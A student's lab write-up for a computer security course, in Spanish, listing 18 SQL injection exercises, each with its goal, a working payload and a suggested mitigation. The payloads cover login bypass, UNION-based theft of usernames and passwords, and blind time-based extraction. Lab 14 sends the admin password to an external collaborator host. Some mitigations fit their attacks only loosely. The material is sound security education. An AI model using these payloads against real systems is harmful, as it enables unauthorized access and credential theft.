SQL Injection Roadmap - Actividad 08

SQL Injection Labs Roadmap

Materia: CNO V: Seguridad Informática

Alumno: Alonso Castillo Omar Karim (179033)

Foco Secundario: Road to Hall of Fame

Bienvenidos al módulo Road to Hall of Fame enfocado en SQL Injection. Este apartado presenta una arquitectura de progreso a través de los diversos laboratorios prácticos superados durante el curso, englobando las fases críticas desde métodos in-band booleanos hasta evasión avanzada WAF y técnicas Out-of-Band (OAST). A continuación se documenta el progreso estructurado de los 18 retos vulnerables y analizados, detallando la evidencia, cargas maliciosas utilizadas (payloads) y las mitigaciones teóricas requeridas.

Fase 1: SQLi Beginner (Fundamentos)

1. Lab: SQLi in WHERE clause (Hidden data)

Apprentice
Tipo: In-band (Booleano)
Objetivo: Visualizar productos no publicados.
Explicación: Falta de sanitización en el parámetro category, permitiendo alterar la lógica de la consulta mediante operadores lógicos.
Payload: ' OR 1=1--
Mitigación: Uso de consultas parametrizadas (Prepared Statements).

2. Lab: SQLi login bypass

Apprentice
Tipo: In-band (Autenticación)
Objetivo: Acceder como administrador sin conocer la contraseña.
Explicación: Vulnerabilidad en el formulario de login que permite truncar la verificación de credenciales.
Payload: administrator'--
Mitigación: Deshabilitar la construcción dinámica de queries en procesos de login.

Fase 2: UNION-Based SQLi (Exfiltración)

3. Lab: SQLi UNION attack (Determining columns)

Practitioner
Tipo: UNION-based
Objetivo: Determinar cuántas columnas devuelve la consulta original.
Explicación: Uso de la cláusula UNION para inyectar una consulta adicional con el mismo número de columnas.
Payload: ' ORDER BY 3--
Mitigación: Implementar validación estricta de tipos de datos en parámetros de entrada.

4. Lab: SQLi UNION attack (Finding useful columns)

Practitioner
Tipo: UNION-based
Objetivo: Identificar qué columna acepta datos de tipo texto.
Explicación: Prueba sistemática de columnas para encontrar una compatible con strings para extraer datos.
Payload: ' UNION SELECT 'abc',NULL,NULL--
Mitigación: Aplicar el principio de menor privilegio en la cuenta de la base de datos.

5. Lab: SQLi UNION attack (Retrieving data)

Practitioner
Tipo: UNION-based
Objetivo: Extraer nombres de usuario y contraseñas de la tabla users.
Explicación: Ejecución de una segunda consulta que recupera datos sensibles de una tabla distinta.
Payload: ' UNION SELECT username, password FROM users--
Mitigación: Evitar mostrar errores detallados de la base de datos al usuario final.

6. Lab: SQLi UNION attack (Multiple values in one column)

Practitioner
Tipo: UNION-based
Objetivo: Extraer múltiples datos cuando solo hay una columna de texto disponible.
Explicación: Concatenación de múltiples campos para que se muestren como un solo resultado.
Payload: ' UNION SELECT NULL, username || '~' || password FROM users--
Mitigación: Sanitizar caracteres especiales y delimitadores en las entradas.

Fase 3: Database Fingerprinting (Versiones)

7. Lab: SQLi querying version (Oracle)

Practitioner
Tipo: In-band (Oracle)
Objetivo: Identificar la versión de la base de datos Oracle.
Explicación: Inyección de consultas específicas hacia tablas del sistema (como v$version).
Payload: ' UNION SELECT banner, NULL FROM v$version--
Mitigación: Ocultar banners de versión y metadatos del servidor.

8. Lab: SQLi querying version (MySQL/Microsoft)

Practitioner
Tipo: In-band (MySQL/MSSQL)
Objetivo: Obtener la versión en entornos no Oracle.
Explicación: Uso de variables globales o funciones integradas propias del motor.
Payload: ' UNION SELECT @@version, NULL%23
Mitigación: Uso de WAF para detectar firmas de consultas a variables de sistema.

Fase 4: Blind SQLi (Inferencia)

9. Lab: Blind SQLi with conditional responses

Practitioner
Tipo: Blind (Booleano)
Objetivo: Recuperar la contraseña del admin analizando la respuesta de la página.
Explicación: La aplicación no muestra datos, pero su respuesta varía (ej: mensaje "Welcome") según si la condición es verdadera.
Payload: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
Mitigación: No variar el contenido de la respuesta basado en el éxito de una subconsulta interna.

10. Lab: Blind SQLi with conditional errors

Practitioner
Tipo: Blind (Error-based)
Objetivo: Exfiltrar datos provocando errores controlados.
Explicación: Uso de funciones como TO_CHAR(1/0) para forzar un error si una condición se cumple.
Payload: '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
Mitigación: Configuración de páginas de error genéricas que no revelen el estado de la DB.

11. Lab: Blind SQLi with time delays

Practitioner
Tipo: Blind (Time-based)
Objetivo: Confirmar la vulnerabilidad mediante pausas en la respuesta.
Explicación: Uso de funciones de retardo (sleep) para detectar la ejecución de comandos.
Payload: '; IF (1=1) WAITFOR DELAY '0:0:10'--
Mitigación: Limitar el tiempo de ejecución de las consultas en el servidor de aplicaciones.

12. Lab: Blind SQLi with time delays (Data exfiltration)

Practitioner
Tipo: Blind (Time-based)
Objetivo: Extraer la contraseña midiendo tiempos de respuesta.
Explicación: Se condiciona el retraso de tiempo a que un carácter de la contraseña sea correcto.
Payload: '%3bIF+(username='administrator'+AND+substring(password,1,1)='a')+WAITFOR+DELAY+'0:0:10'--
Mitigación: Implementar detección de anomalías de tiempo y rate limiting.

Fase 5: OAST y Evasión Avanzada

13. Lab: SQLi via cookie manipulation

Practitioner
Tipo: Blind (Inyección en cabeceras)
Objetivo: Explotar una vulnerabilidad en un campo no visible (Cookie de rastreo).
Explicación: Inyección en vectores secundarios que a menudo tienen menos seguridad que los formularios.
Payload: TrackingId=xyz' AND (SELECT 1 FROM users WHERE username='admin')='1
Mitigación: Tratar todos los datos provenientes del cliente (incluidas Cookies) como inseguros.

14. Lab: SQLi with out-of-band (OAST)

Practitioner
Tipo: Out-of-band
Objetivo: Extraer datos mediante interacciones DNS/HTTP externas.
Explicación: Se fuerza a la base de datos a realizar una petición externa para enviar el dato.
Payload: '+UNION+SELECT+EXTRACTVALUE(xmltype('<%21entity+%25+remote+SYSTEM+"http://'+(SELECT+password+FROM+users+WHERE+username='administrator')+'.burpcollaborator.net/">%25remote%3b'),'/l')+FROM+dual--
Mitigación: Restringir el tráfico de salida (egress) desde el servidor de base de datos.

15. Lab: SQLi with WAF Bypass (Hex Encoding)

Practitioner
Tipo: In-band (Evasión)
Objetivo: Superar la protección de un WAF para extraer credenciales.
Explicación: Uso de codificación hexadecimal y entidades XML para que el WAF no reconozca el payload SQL.
Payload: UNION SELECT (codificado en Hex mediante la extensión Hackvertor)
Mitigación: Configurar el WAF para decodificar múltiples capas antes de inspeccionar.

16. Lab: SQLi in JSON parameters

Practitioner
Tipo: In-band (NoSQL/JSON Context)
Objetivo: Manipular datos estructurados en formato JSON.
Explicación: Inyección dentro de una cadena JSON enviada vía POST que el backend procesa directamente en SQL.
Payload: {"id": "1' OR 1=1--"}
Mitigación: Deserialización segura y tipado fuerte en objetos JSON.

17. Lab: SQLi with string concatenation bypass

Practitioner
Tipo: In-band (Evasión)
Objetivo: Evadir filtros que bloquean espacios o palabras clave.
Explicación: Uso de operadores de concatenación (||, +, CONCAT) para reconstruir comandos.
Payload: 'UNION/**/SELECT/**/NULL,username%7C%7C'~'%7C%7Cpassword/**/FROM/**/users--
Mitigación: Implementar una "Lista Blanca" de caracteres permitidos.
[Evidencia Gráfica del Laboratorio - Pendiente Inserción]

18. Lab: SQLi for privilege escalation

Practitioner
Tipo: In-band (Escalada)
Objetivo: Cambiar el rol del usuario actual a administrador.
Explicación: Explotación de una vulnerabilidad de actualización (UPDATE) para modificar registros de control.
Payload: ', role='admin' WHERE username='wiener'--
Mitigación: Separación estricta de privilegios y validación de permisos a nivel de fila.
